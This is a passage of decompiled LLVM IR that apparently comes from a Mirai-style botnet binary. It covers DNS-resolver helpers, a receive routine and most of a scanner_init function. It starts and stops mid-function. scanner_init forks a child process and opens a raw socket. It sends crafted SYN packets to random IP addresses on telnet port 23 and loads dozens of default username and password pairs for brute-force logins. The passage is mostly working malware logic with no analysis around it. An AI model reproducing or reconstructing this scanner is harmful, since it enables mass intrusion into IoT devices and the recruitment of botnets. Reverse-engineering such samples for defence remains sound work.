  store i32 %v3_15fec, i32* @r1, align 4
  %v3_15ff4 = mul nuw nsw i32 %v3_15fec, 4
  %v2_15ff8 = add i32 %v3_15ff4, %v3_15fcc
  %v2_16000 = load i32, i32* %tmp_buf_-4224, align 4
  %v2_16004 = inttoptr i32 %v2_15ff8 to i32*
  store i32 %v2_16000, i32* %v2_16004, align 4
  %v0_16008 = load i32, i32* @r1, align 4
  %v1_16008 = add i32 %v0_16008, 1
  %v1_16014 = trunc i32 %v1_16008 to i8
  store i8 %v1_16014, i8* %v1_15fb8, align 1
  br label %dec_label_pc_16018

dec_label_pc_16018:                               ; preds = %dec_label_pc_15f14, %dec_label_pc_15f9c
  %v3_1601c = load i8, i8* %v2_15f18, align 1
  %v4_1601c = zext i8 %v3_1601c to i32
  %v3_16020 = load i8, i8* %v2_15f1c, align 1
  %v4_16020 = zext i8 %v3_16020 to i32
  %v3_16024 = mul nuw nsw i32 %v4_16020, 256
  %v2_16028 = or i32 %v3_16024, %v4_1601c
  %v1_16038 = call i32 @__GI_ntohs(i32 %v2_16028)
  br label %dec_label_pc_160a0.backedge

dec_label_pc_16054:                               ; preds = %dec_label_pc_15ee4, %dec_label_pc_15e4c
  %v1_16070 = inttoptr i32 %v1_15eac to i8*
  call void @resolv_skip_name(i8* %v1_16070, i8* %v4_15dd0.le, i32* nonnull %stop_-4220)
  %v4_1608c = load i32, i32* %stop_-4220, align 4
  br label %dec_label_pc_160a0.backedge

dec_label_pc_160a0.backedge:                      ; preds = %dec_label_pc_16054, %dec_label_pc_16018
  %v4_1608c.pn = phi i32 [ %v1_16038, %dec_label_pc_16018 ], [ %v4_1608c, %dec_label_pc_16054 ]
  %dnsa_-44.0.be = add i32 %v4_1608c.pn, %v1_15eac
  %v4_160a0 = zext i16 %v1_160a825 to i32
  %v1_160a4 = add nsw i32 %v4_160a0, -1
  %v1_160a8 = trunc i32 %v1_160a4 to i16
  %v4_160ac = urem i32 %v1_160a4, 65536
  %v3_160b8 = icmp eq i32 %v4_160ac, 65535
  br i1 %v3_160b8, label %dec_label_pc_160ec, label %dec_label_pc_15e4c

dec_label_pc_160ec:                               ; preds = %dec_label_pc_160c4.outer.backedge, %dec_label_pc_15c48, %dec_label_pc_15d30, %bb.backedge, %dec_label_pc_160a0.backedge, %dec_label_pc_15e30
  %i_-72.1 = phi i32 [ %v3_15b48, %dec_label_pc_15e30 ], [ %v3_15b48, %dec_label_pc_160a0.backedge ], [ %v3_15b48, %dec_label_pc_160c4.outer.backedge ], [ %v3_15b48, %dec_label_pc_15c48 ], [ %v3_15b48, %dec_label_pc_15d30 ], [ %i_-72.0.be, %bb.backedge ]
  %v1_160f0 = call i32 @__GI___libc_close(i32 %i_-72.1)
  %v1_160f8 = inttoptr i32 %v2_15918 to i8*
  %v2_160f8 = load i8, i8* %v1_160f8, align 1
  %v2_160fc = icmp eq i8 %v2_160f8, 0
  br i1 %v2_160fc, label %dec_label_pc_16114, label %dec_label_pc_16104

dec_label_pc_16104:                               ; preds = %dec_label_pc_160ec
  br label %dec_label_pc_16128

dec_label_pc_16114:                               ; preds = %dec_label_pc_160ec
  call void @resolv_entries_free(i32 %v2_15918)
  br label %dec_label_pc_16128

dec_label_pc_16128:                               ; preds = %dec_label_pc_16104, %dec_label_pc_16114
  %storemerge = phi i32 [ 0, %dec_label_pc_16114 ], [ %v2_15918, %dec_label_pc_16104 ]
  ret i32 %storemerge

; uselistorder directives
  uselistorder i32 %storemerge1417, { 2, 0, 1 }
  uselistorder i32 %v1_15eac, { 0, 2, 1 }
  uselistorder i32 %fold, { 1, 0 }
  uselistorder i32 %v5_15d0c, { 1, 0 }
  uselistorder i32 %v1_15c78, { 1, 0 }
  uselistorder %anon_struct_3* %v4_15c38, { 1, 0 }
  uselistorder i32 %v1_15c34, { 1, 0 }
  uselistorder i32 %v4_15c3c83, { 1, 0 }
  uselistorder i32 %v3_15b48, { 2, 3, 4, 5, 6, 12, 1, 0, 13, 14, 15, 16, 8, 9, 10, 11, 18, 17, 7 }
  uselistorder i32 %i_-72.088, { 1, 0 }
  uselistorder i32 %v2_15d7c, { 0, 3, 1, 2 }
  uselistorder i32 %v2_15c0c, { 1, 0 }
  uselistorder i32 %v0_159e0, { 1, 0 }
  uselistorder i32 %v2_1592c, { 2, 0, 1, 3 }
  uselistorder i32 %v2_15918, { 3, 2, 4, 1, 0 }
  uselistorder i32 %v2_15908, { 1, 0 }
  uselistorder i32* %stack_var_-4, { 1, 0 }
  uselistorder i32* %addr_-4208, { 1, 0, 2, 3 }
  uselistorder %timeval_2* %timeo_-4216, { 1, 0 }
  uselistorder i32* %stop_-4220, { 2, 0, 3, 1 }
  uselistorder void (i8*, i8*, i32*)* @resolv_skip_name, { 1, 0 }
  uselistorder i32 (i32)* @sleep, { 11, 10, 9, 8, 7, 6, 5, 4, 3, 2, 1, 0 }
  uselistorder label %dec_label_pc_16128, { 1, 0 }
  uselistorder label %dec_label_pc_160ec, { 4, 5, 0, 2, 1, 3 }
  uselistorder label %dec_label_pc_16018, { 1, 0 }
  uselistorder label %dec_label_pc_15f50, { 1, 0 }
  uselistorder label %dec_label_pc_15e4c, { 1, 0 }
  uselistorder label %dec_label_pc_15c20, { 1, 0 }
  uselistorder label %bb.backedge, { 0, 4, 3, 2, 1 }
  uselistorder label %dec_label_pc_15b3c, { 1, 0 }
  uselistorder label %dec_label_pc_15b28, { 1, 0 }
  uselistorder label %dec_label_pc_15b28.lr.ph, { 1, 0 }
}

define void @resolv_entries_free(i32 %entries) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  store i32 %entries, i32* %r0.global-to-local, align 4
  %v0_16150 = load i32, i32* %r0.global-to-local, align 4
  %v2_16158 = icmp eq i32 %v0_16150, 0
  br i1 %v2_16158, label %dec_label_pc_16188, label %dec_label_pc_16160

dec_label_pc_16160:                               ; preds = %entry
  %v1_16164 = add i32 %v0_16150, 4
  %v2_16164 = inttoptr i32 %v1_16164 to i32*
  %v3_16164 = load i32, i32* %v2_16164, align 4
  %v2_16168 = icmp eq i32 %v3_16164, 0
  br i1 %v2_16168, label %dec_label_pc_16180, label %dec_label_pc_16170

dec_label_pc_16170:                               ; preds = %dec_label_pc_16160
  %v3_16174 = load i32, i32* %v2_16164, align 4
  store i32 %v3_16174, i32* @r0, align 4
  %v0_1617c = call i32 @free()
  store i32 %v0_1617c, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_16180

dec_label_pc_16180:                               ; preds = %dec_label_pc_16160, %dec_label_pc_16170
  store i32 %v0_16150, i32* @r0, align 4
  %v0_16184 = call i32 @free()
  store i32 %v0_16184, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_16188

dec_label_pc_16188:                               ; preds = %entry, %dec_label_pc_16180
  ret void

; uselistorder directives
  uselistorder i32* %r0.global-to-local, { 2, 3, 0, 1 }
  uselistorder label %dec_label_pc_16188, { 1, 0 }
  uselistorder label %dec_label_pc_16180, { 1, 0 }
}

define i32 @recv_strip_null(i32 %sock, i8* %buf, i32 %len, i32 %flags) local_unnamed_addr {
entry:
  %tmp = ptrtoint i8* %buf to i32
  %v6_161c8 = call i32 @__libc_recv(i32 %sock, i32 %tmp, i32 %len, i32 %flags)
  %tmp14 = icmp slt i32 %v6_161c8, 1
  br i1 %tmp14, label %dec_label_pc_1623c, label %dec_label_pc_161f4.lr.ph

dec_label_pc_161f4.lr.ph:                         ; preds = %entry
  br label %dec_label_pc_161f4

dec_label_pc_161f4:                               ; preds = %dec_label_pc_161f4.lr.ph, %dec_label_pc_16220
  %storemerge222 = phi i32 [ 0, %dec_label_pc_161f4.lr.ph ], [ %v1_16224, %dec_label_pc_16220 ]
  %v2_161fc = add i32 %storemerge222, %tmp
  %v1_16200 = inttoptr i32 %v2_161fc to i8*
  %v2_16200 = load i8, i8* %v1_16200, align 1
  %v2_16204 = icmp eq i8 %v2_16200, 0
  br i1 %v2_16204, label %dec_label_pc_1620c, label %dec_label_pc_16220

dec_label_pc_1620c:                               ; preds = %dec_label_pc_161f4
  store i8 65, i8* %v1_16200, align 1
  br label %dec_label_pc_16220

dec_label_pc_16220:                               ; preds = %dec_label_pc_161f4, %dec_label_pc_1620c
  %v1_16224 = add nuw nsw i32 %storemerge222, 1
  %v5_16238 = icmp slt i32 %v1_16224, %v6_161c8
  br i1 %v5_16238, label %dec_label_pc_161f4, label %dec_label_pc_1623c

dec_label_pc_1623c:                               ; preds = %dec_label_pc_16220, %entry
  ret i32 %v6_161c8

; uselistorder directives
  uselistorder i32 %v6_161c8, { 1, 0, 2 }
  uselistorder i32 (i32, i32, i32, i32)* @__libc_recv, { 4, 9, 8, 7, 6, 5, 3, 2, 1, 0 }
  uselistorder label %dec_label_pc_16220, { 1, 0 }
  uselistorder label %dec_label_pc_161f4, { 1, 0 }
}

define void @scanner_init() local_unnamed_addr {
entry:
  %tmp79 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-200 = alloca i32, align 4
  %stack_var_-196 = alloca i32, align 4
  %stack_var_-192 = alloca i32, align 4
  %stack_var_-188 = alloca i32, align 4
  %err_len_-184 = alloca i32, align 4
  %err_-180 = alloca i32, align 4
  %paddr_-176 = alloca i32, align 4
  %tim_-156 = alloca %timeval_3, align 8
  %stack_var_-24 = alloca i32, align 4
  %fdset_wr_-456 = alloca %anon_struct_4.39, align 8
  %fdset_rd_-328 = alloca %anon_struct_4, align 8
  %dgram_-1970 = alloca [1514 x i8], align 1
  %paddr_-172 = alloca i32, align 4
  %i_-148 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v3_16254 = load i32, i32* @r4, align 4
  %v6_16254 = load i32, i32* @fp, align 4
  store i32 90716, i32* %stack_var_-4, align 4
  %v2_16258 = ptrtoint i32* %stack_var_-4 to i32
  store i32 %v2_16258, i32* @fp, align 4
  %v0_16264 = call i32 @__libc_fork()
  store i32 %v0_16264, i32* @scanner_pid, align 4
  %v5_16280 = icmp sgt i32 %v0_16264, 0
  br i1 %v5_16280, label %dec_label_pc_179bc, label %dec_label_pc_16284

dec_label_pc_16284:                               ; preds = %entry
  %v3_1628c = icmp eq i32 %v0_16264, -1
  br i1 %v3_1628c, label %dec_label_pc_179bc, label %dec_label_pc_16298

dec_label_pc_16298:                               ; preds = %dec_label_pc_16284
  %v0_16298 = call i32 @util_local_addr()
  store i32 %v0_16298, i32* @LOCAL_ADDR, align 4
  call void @rand_init()
  %v2_162b0 = call i32 @__GI_time(i32* null)
  store i32 %v2_162b0, i32* @fake_time, align 4
  %v2_162cc = call i32 @calloc(i32 256, i32 288)
  store i32 %v2_162cc, i32* @conn_table, align 4
  store i32 0, i32* %i_-148, align 4
  br label %dec_label_pc_162ec

dec_label_pc_162ec:                               ; preds = %dec_label_pc_162ec.dec_label_pc_162ec_crit_edge, %dec_label_pc_16298
  %v2_16304 = phi i32 [ %v2_162cc, %dec_label_pc_16298 ], [ %v2_16304.pre, %dec_label_pc_162ec.dec_label_pc_162ec_crit_edge ]
  %v3_162ec = phi i32 [ 0, %dec_label_pc_16298 ], [ %v1_16350, %dec_label_pc_162ec.dec_label_pc_162ec_crit_edge ]
  %v2_162f8 = mul i32 %v3_162ec, 288
  %v2_16308 = add i32 %v2_16304, 12
  %v2_16310 = add i32 %v2_16308, %v2_162f8
  %v3_16310 = inttoptr i32 %v2_16310 to i32*
  store i32 0, i32* %v3_16310, align 4
  %v3_16314 = load i32, i32* %i_-148, align 4
  %v2_16320 = mul i32 %v3_16314, 288
  %v2_1632c = load i32, i32* @conn_table, align 4
  %v2_16330 = or i32 %v2_16320, 4
  %v2_16338 = add i32 %v2_16330, %v2_1632c
  %v3_16338 = inttoptr i32 %v2_16338 to i32*
  store i32 -1, i32* %v3_16338, align 4
  %v3_1633c = load i32, i32* %i_-148, align 4
  %v5_16348 = mul i32 %v3_1633c, 4
  %v6_16348 = add i32 %v5_16348, ptrtoint ([256 x i32]* @authindex_table to i32)
  %v7_16348 = inttoptr i32 %v6_16348 to i32*
  store i32 0, i32* %v7_16348, align 4
  %v3_1634c = load i32, i32* %i_-148, align 4
  %v1_16350 = add i32 %v3_1634c, 1
  store i32 %v1_16350, i32* %i_-148, align 4
  %v7_16360 = icmp slt i32 %v1_16350, 256
  br i1 %v7_16360, label %dec_label_pc_162ec.dec_label_pc_162ec_crit_edge, label %dec_label_pc_16364

dec_label_pc_162ec.dec_label_pc_162ec_crit_edge:  ; preds = %dec_label_pc_162ec
  %v2_16304.pre = load i32, i32* @conn_table, align 4
  br label %dec_label_pc_162ec

dec_label_pc_16364:                               ; preds = %dec_label_pc_162ec
  %v3_16370 = call i32 @socket(i32 2, i32 3, i32 6)
  store i32 %v3_16370, i32* @rsck, align 4
  %v3_16388 = icmp eq i32 %v3_16370, -1
  br i1 %v3_16388, label %dec_label_pc_16390, label %dec_label_pc_16398

dec_label_pc_16390:                               ; preds = %dec_label_pc_16364
  %v1_16394 = call i32 @__GI_exit(i32 0)
  %v2_1639c.pre = load i32, i32* @rsck, align 4
  br label %dec_label_pc_16398

dec_label_pc_16398:                               ; preds = %dec_label_pc_16364, %dec_label_pc_16390
  %v2_1639c = phi i32 [ %v3_16370, %dec_label_pc_16364 ], [ %v2_1639c.pre, %dec_label_pc_16390 ]
  store i32 %v2_1639c, i32* @r4, align 4
  store i32 %v2_1639c, i32* @r3, align 4
  store i32 0, i32* @r2, align 4
  %v2_163b4 = call i32 @__libc_fcntl(i32 %v2_1639c, i32 3)
  %v1_163bc = or i32 %v2_163b4, 2048
  store i32 %v1_163bc, i32* @r3, align 4
  %v0_163c0 = load i32, i32* @r4, align 4
  store i32 %v1_163bc, i32* @r2, align 4
  %v2_163cc = call i32 @__libc_fcntl(i32 %v0_163c0, i32 4)
  store i32 1, i32* %i_-148, align 4
  %v2_163dc = load i32, i32* @rsck, align 4
  %v2_163e0 = ptrtoint i32* %i_-148 to i32
  store i32 0, i32* @r1, align 4
  %v5_163fc = call i32 @__GI_setsockopt(i32 %v2_163dc, i32 0, i32 3, i32 %v2_163e0, i32 4)
  %v2_16404 = icmp eq i32 %v5_163fc, 0
  br i1 %v2_16404, label %dec_label_pc_16424, label %dec_label_pc_1640c

dec_label_pc_1640c:                               ; preds = %dec_label_pc_16398
  %v2_16410 = load i32, i32* @rsck, align 4
  %v1_16418 = call i32 @__GI___libc_close(i32 %v2_16410)
  %v1_16420 = call i32 @__GI_exit(i32 0)
  br label %dec_label_pc_16424

dec_label_pc_16424:                               ; preds = %dec_label_pc_16398, %dec_label_pc_1640c, %dec_label_pc_16424
  %v0_16424 = call i32 @rand_next()
  %sext = mul i32 %v0_16424, 65536
  %v1_16428 = sdiv i32 %sext, 65536
  %v4_16430 = urem i32 %v1_16428, 65536
  %v1_16438 = call i32 @__GI_ntohs(i32 %v4_16430)
  %tmp = icmp ult i32 %v1_16438, 1024
  br i1 %tmp, label %dec_label_pc_16424, label %dec_label_pc_16454

dec_label_pc_16454:                               ; preds = %dec_label_pc_16424
  %v1_1642c.le = trunc i32 %v1_16428 to i16
  store i8 69, i8* getelementptr inbounds ([40 x i8], [40 x i8]* @scanner_rawpkt, i32 0, i32 0), align 16
  %v1_164b4 = call i32 @__GI_htons(i32 40)
  %sext3 = mul i32 %v1_164b4, 65536
  %v1_164b8 = sdiv i32 %sext3, 65536
  %v1_164c4 = trunc i32 %v1_164b8 to i16
  store i16 %v1_164c4, i16* bitcast (i32* @global_var_2c27e.191 to i16*), align 4
  %v0_164c8 = call i32 @rand_next()
  %v1_164dc = trunc i32 %v0_164c8 to i16
  store i16 %v1_164dc, i16* bitcast (i32* @global_var_2c280.192 to i16*), align 4
  store i8 64, i8* bitcast (i32* @global_var_2c284.193 to i8*), align 4
  store i8 6, i8* bitcast (i32* @global_var_2c285.194 to i8*), align 4
  %v1_164fc = call i32 @__GI_htons(i32 23)
  %v1_1650c = trunc i32 %v1_164fc to i16
  store i16 %v1_1650c, i16* @global_var_2c292.195, align 2
  store i16 %v1_1642c.le, i16* bitcast (i32* @global_var_2c290.190 to i16*), align 4
  %v3_16520 = load i8, i8* @global_var_2c29c.196, align 1
  %tmp135 = urem i8 %v3_16520, 16
  %v1_16530 = or i8 %tmp135, 80
  store i8 %v1_16530, i8* @global_var_2c29c.196, align 1
  %v0_16540 = call i32 @rand_next()
  %v1_16554 = trunc i32 %v0_16540 to i16
  store i16 %v1_16554, i16* bitcast (i32* @global_var_2c29e.197 to i16*), align 4
  %v3_1655c = load i8, i8* @global_var_2c29d.198, align 1
  %v1_1656c = or i8 %v3_1655c, 2
  store i8 %v1_1656c, i8* @global_var_2c29d.198, align 1
  call void @add_auth_entry(i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_22ef0.200, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_22ef0.200, i32 0, i32 0), i16 10)
  call void @add_auth_entry(i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_22ef8.202, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_22ef8.202, i32 0, i32 0), i16 10)
  call void @add_auth_entry(i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_22ef0.200, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_22f00.204, i32 0, i32 0), i16 10)
  call void @add_auth_entry(i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_22ef0.200, i32 0, i32 0), i8* bitcast (i8** @global_var_22f08.206 to i8*), i16 10)
  call void @add_auth_entry(i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_22ef0.200, i32 0, i32 0), i8* bitcast (i8** @global_var_22f10.208 to i8*), i16 10)
  call void @add_auth_entry(i8* getelementptr inbounds ([8 x i8], [8 x i8]* @global_var_22f18.210, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_22f20.212, i32 0, i32 0), i16 10)
  call void @add_auth_entry(i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_22ef0.200, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @global_var_22f28.214, i32 0, i32 0), i16 10)
  call void @add_auth_entry(i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_22ef8.202, i32 0, i32 0), i8* bitcast (i8** @global_var_22f30.216 to i8*), i16 10)
  call void @add_auth_entry(i8* getelementptr inbounds ([8 x i8], [8 x i8]* @global_var_22f38.218, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @global_var_22f38.218, i32 0, i32 0), i16 10)
  call void @add_auth_entry(i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_22ef0.200, i32 0, i32 0), i8* bitcast (i8** @global_var_22f40.220 to i8*), i16 10)
  call void @add_auth_entry(i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_22ef0.200, i32 0, i32 0), i8* bitcast (i8** @global_var_22f48.222 to i8*), i16 10)
  call void @add_auth_entry(i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_22ef0.200, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_22f54.224, i32 0, i32 0), i16 10)
  call void @add_auth_entry(i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_22ef8.202, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_22f54.224, i32 0, i32 0), i16 10)
  call void @add_auth_entry(i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_22ef0.200, i32 0, i32 0), i8* bitcast (i8** @global_var_22f60.226 to i8*), i16 10)
  call void @add_auth_entry(i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_22ef0.200, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_22f68.228, i32 0, i32 0), i16 10)
  call void @add_auth_entry(i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_22ef0.200, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_22ef8.202, i32 0, i32 0), i16 10)
  call void @add_auth_entry(i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_22ef8.202, i32 0, i32 0), i8* bitcast (i8** @global_var_22f40.220 to i8*), i16 10)
  call void @add_auth_entry(i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_22ef8.202, i32 0, i32 0), i8* bitcast (i8** @global_var_22f74.230 to i8*), i16 10)
  call void @add_auth_entry(i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_22ef8.202, i32 0, i32 0), i8* bitcast (i8** @global_var_22f7c.232 to i8*), i16 10)
  call void @add_auth_entry(i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_22ef0.200, i32 0, i32 0), i8* bitcast (i8** @global_var_22f84.234 to i8*), i16 10)
  call void @add_auth_entry(i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_22f8c.236, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_22f8c.236, i32 0, i32 0), i16 10)
  call void @add_auth_entry(i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_22f94.238, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_22f94.238, i32 0, i32 0), i16 10)
  call void @add_auth_entry(i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_22ef0.200, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_22f9c.240, i32 0, i32 0), i16 10)
  call void @add_auth_entry(i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_22ef0.200, i32 0, i32 0), i8* bitcast (i8** @global_var_22fa4.242 to i8*), i16 10)
  call void @add_auth_entry(i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_22ef0.200, i32 0, i32 0), i8* bitcast (i8** @global_var_22fb0.244 to i8*), i16 10)
  call void @add_auth_entry(i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_22ef8.202, i32 0, i32 0), i8* bitcast (i8** @global_var_22fb4.246 to i8*), i16 10)
  call void @add_auth_entry(i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_22ef0.200, i32 0, i32 0), i8* bitcast (i8** @global_var_22fbc.248 to i8*), i16 10)
  call void @add_auth_entry(i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_22ef8.202, i32 0, i32 0), i8* bitcast (i8** @global_var_22fc0.250 to i8*), i16 10)
  call void @add_auth_entry(i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_22ef8.202, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @global_var_22fd4.252, i32 0, i32 0), i16 10)
  call void @add_auth_entry(i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_22ef0.200, i32 0, i32 0), i8* bitcast (i8** @global_var_22f74.230 to i8*), i16 10)
  call void @add_auth_entry(i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_22ef8.202, i32 0, i32 0), i8* bitcast (i8** @global_var_22fe0.254 to i8*), i16 10)
  call void @add_auth_entry(i8* getelementptr inbounds ([11 x i8], [11 x i8]* @global_var_22fec.256, i32 0, i32 0), i8* bitcast (i8** @global_var_22ff8.258 to i8*), i16 10)
  call void @add_auth_entry(i8* getelementptr inbounds ([8 x i8], [8 x i8]* @global_var_22f38.218, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_22ef8.202, i32 0, i32 0), i16 10)
  call void @add_auth_entry(i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_22ef0.200, i32 0, i32 0), i8* bitcast (i8** @global_var_23004.260 to i8*), i16 10)
  call void @add_auth_entry(i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_22ef0.200, i32 0, i32 0), i8* bitcast (i8** @global_var_23010.262 to i8*), i16 10)
  call void @add_auth_entry(i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_22ef8.202, i32 0, i32 0), i8* bitcast (i8** @global_var_22fbc.248 to i8*), i16 10)
  call void @add_auth_entry(i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_22ef8.202, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_2301c.264, i32 0, i32 0), i16 10)
  call void @add_auth_entry(i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_22ef0.200, i32 0, i32 0), i8* bitcast (i8** @global_var_23024.266 to i8*), i16 10)
  call void @add_auth_entry(i8* bitcast (i8** @global_var_23030.268 to i8*), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_23038.270, i32 0, i32 0), i16 10)
  call void @add_auth_entry(i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_23040.272, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_23040.272, i32 0, i32 0), i16 10)
  call void @add_auth_entry(i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_22ef8.202, i32 0, i32 0), i8* bitcast (i8** @global_var_23048.274 to i8*), i16 10)
  call void @add_auth_entry(i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_22ef8.202, i32 0, i32 0), i8* bitcast (i8** @global_var_23050.276 to i8*), i16 10)
  call void @add_auth_entry(i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_2305c.278, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_2305c.278, i32 0, i32 0), i16 10)
  call void @add_auth_entry(i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_22ef0.200, i32 0, i32 0), i8* bitcast (i8** @global_var_23068.280 to i8*), i16 10)
  call void @add_auth_entry(i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_22f94.238, i32 0, i32 0), i8* bitcast (i8** @global_var_22f40.220 to i8*), i16 10)
  %v2_16a10 = ptrtoint [1514 x i8]* %dgram_-1970 to i32
  %v1_16a1c = add i32 %v2_16a10, 20
  %v1_16abc = add i32 %v2_16a10, 16
  %v2_16abc = inttoptr i32 %v1_16abc to i32*
  %v1_16ad4 = add i32 %v2_16a10, 9
  %v2_16ad4 = inttoptr i32 %v1_16ad4 to i8*
  %v1_16ae4 = inttoptr i32 %v1_16a1c to i16*
  %v1_16b00 = add i32 %v2_16a10, 22
  %v2_16b00 = inttoptr i32 %v1_16b00 to i16*
  %v1_16b14 = add i32 %v2_16a10, 33
  %v2_16b14 = inttoptr i32 %v1_16b14 to i8*
  %v1_16b64 = add i32 %v2_16a10, 28
  %v2_16b64 = inttoptr i32 %v1_16b64 to i32*
  %v1_16b88 = add i32 %v2_16a10, 12
  %v2_16b88 = inttoptr i32 %v1_16b88 to i32*
  %v2_16c64 = ptrtoint %anon_struct_4* %fdset_rd_-328 to i32
  %v2_16ca0 = ptrtoint %anon_struct_4.39* %fdset_wr_-456 to i32
  %v2_16e28 = ptrtoint i32* %stack_var_-24 to i32
  %v4_16f48 = getelementptr inbounds %timeval_3, %timeval_3* %tim_-156, i32 0, i32 0
  %v2_16f6c = ptrtoint %timeval_3* %tim_-156 to i32
  %v2_1704c = ptrtoint i32* %paddr_-176 to i32
  %v2_17050 = ptrtoint i32* %err_-180 to i32
  %v2_16888 = ptrtoint i32* %paddr_-172 to i32
  br label %dec_label_pc_1684c

dec_label_pc_1684c:                               ; preds = %dec_label_pc_179a0, %dec_label_pc_16454
  %mfd_rd_-124.0 = phi i32 [ %tmp79, %dec_label_pc_16454 ], [ %mfd_rd_-124.1, %dec_label_pc_179a0 ]
  %v2_16864 = load i32, i32* @fake_time, align 4
  %v9_16868 = icmp eq i32 %mfd_rd_-124.0, %v2_16864
  br i1 %v9_16868, label %dec_label_pc_16a00, label %dec_label_pc_16870

dec_label_pc_16870:                               ; preds = %dec_label_pc_1684c
  store i32 0, i32* %i_-148, align 4
  br label %dec_label_pc_16888

dec_label_pc_16888:                               ; preds = %dec_label_pc_16870, %dec_label_pc_16888
  store i32 0, i32* %paddr_-172, align 4
  %v0_168cc = call i32 @rand_next()
  %v1_168e0 = trunc i32 %v0_168cc to i16
  store i16 %v1_168e0, i16* bitcast (i32* @global_var_2c280.192 to i16*), align 4
  %v2_168e8 = load i32, i32* @LOCAL_ADDR, align 4
  store i32 %v2_168e8, i32* @global_var_2c288.281, align 4
  %v2_168f4 = call i32 @get_random_ip()
  store i32 %v2_168f4, i32* @global_var_2c28c.282, align 4
  store i16 0, i16* bitcast (i32* @global_var_2c286.283 to i16*), align 4
  %v5_1691c = call i16 @checksum_generic(i16* bitcast ([40 x i8]* @scanner_rawpkt to i16*), i32 20)
  store i16 %v5_1691c, i16* bitcast (i32* @global_var_2c286.283 to i16*), align 4
  %v1_16934 = call i32 @__GI_htons(i32 23)
  %v1_16944 = trunc i32 %v1_16934 to i16
  store i16 %v1_16944, i16* @global_var_2c292.195, align 2
  %v3_1694c = load i32, i32* @global_var_2c28c.282, align 4
  store i32 %v3_1694c, i32* @global_var_2c294.284, align 4
  store i16 0, i16* bitcast (i32* @global_var_2c2a0.285 to i16*), align 4
  %v1_16968 = call i32 @__GI_htons(i32 20)
  %v1_16978 = trunc i32 %v1_16968 to i16
  %v8_16980 = call i16 @checksum_tcpudp(i32 ptrtoint ([40 x i8]* @scanner_rawpkt to i32), i8* bitcast (i32* @global_var_2c290.190 to i8*), i16 %v1_16978, i32 20)
  store i16 %v8_16980, i16* bitcast (i32* @global_var_2c2a0.285 to i16*), align 4
  store i32 2, i32* %paddr_-172, align 4
  %v2_169b8 = load i32, i32* @rsck, align 4
  %v7_169dc = call i32 @__libc_sendto(i32 %v2_169b8, i32 ptrtoint ([40 x i8]* @scanner_rawpkt to i32), i32 40, i32 16384, i32 %v2_16888, i32 16)
